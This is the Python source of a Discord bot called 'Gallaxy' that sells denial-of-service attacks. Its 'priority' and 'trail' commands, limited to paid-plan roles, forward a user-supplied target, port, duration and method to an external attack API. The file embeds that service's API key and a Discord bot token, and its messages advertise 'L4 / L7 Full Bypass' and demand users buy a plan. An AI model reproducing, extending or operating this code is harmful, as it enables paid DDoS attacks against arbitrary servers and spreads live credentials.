import discord
from discord.ext import commands
from discord.ext import tasks
from itertools import cycle
from discord import Activity, ActivityType
import asyncio
import requests
import os

bot = commands.Bot(command_prefix='.')

status = cycle(['Gallaxy','Best L4 / L7 Full Bypass'])

@bot.event
async def on_ready():
  change_status.start()
  print('{0.user}'.format(bot))
  print('Is Online')

@tasks.loop(seconds=2)
async def change_status():
  await bot.change_presence(activity=discord.Game(next(status)))
  
@bot.command()
async def clear(ctx, amount=5):
 await ctx.channel.purge(limit=amount)

@bot.command(name='priority')
@commands.has_role(985591812251062312)
async def attack(ctx, target, port, time, method):
    api = f"https://rocket-api.digital/type/attack?key=k3MJ9jupGaG8olW3&username=maneq&host={target}&port={port}&time={time}&method={method}"
    embed = discord.Embed(title="Gallaxy | Attack", color=0xa05cff)
    embed.add_field(name="> Target", value=f"> {target}", inline=False)
    embed.add_field(name="> Port", value=f"> {port}", inline=False)
    embed.add_field(name="> Time", value=f"> {time}", inline=False)
    embed.add_field(name="> Method", value=f"> {method}", inline=False)
    embed.add_field(name="> Author", value=f"> {ctx.author}", inline=False)
    embed.set_thumbnail(url="https://i.postimg.cc/4yj9m9TQ/110-chef.gif")
    await ctx.send(embed=embed)
    response = requests.get(api)

@bot.command(name='trail')
@commands.has_role(985591914474647643)
async def attack(ctx, target, port, time, method):
    api = f"https://rocket-api.digital/type/attack?key=k3MJ9jupGaG8olW3&username=maneq&host={target}&port={port}&time={time}&method={method}"
    embed = discord.Embed(title="Gallaxy | Attack", color=0xa05cff)
    embed.add_field(name="> Target", value=f"> {target}", inline=False)
    embed.add_field(name="> Port", value=f"> {port}", inline=False)
    embed.add_field(name="> Time", value=f"> {time}", inline=False)
    embed.add_field(name="> Method", value=f"> {method}", inline=False)
    embed.add_field(name="> Author", value=f"> {ctx.author}", inline=False)
    embed.set_thumbnail(url="https://i.postimg.cc/4yj9m9TQ/110-chef.gif")
    await ctx.send(embed=embed)
    response = requests.get(api)

@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.errors.CheckFailure):
        error2 = discord.Embed(title=f"Gallaxy | Plan", description=f"> You can't launch an attack until you buy a plan {ctx.author}", color=0xff5460, inline=False)
        await ctx.channel.send(embed=error2)

bot.run('OTc5NDUyODA3NzY3ODE4Mjgw.Gd3Mhd.nA3GTHls9oc9YV_ZvS2dJzYgkoWf4SfAIbJb9Q')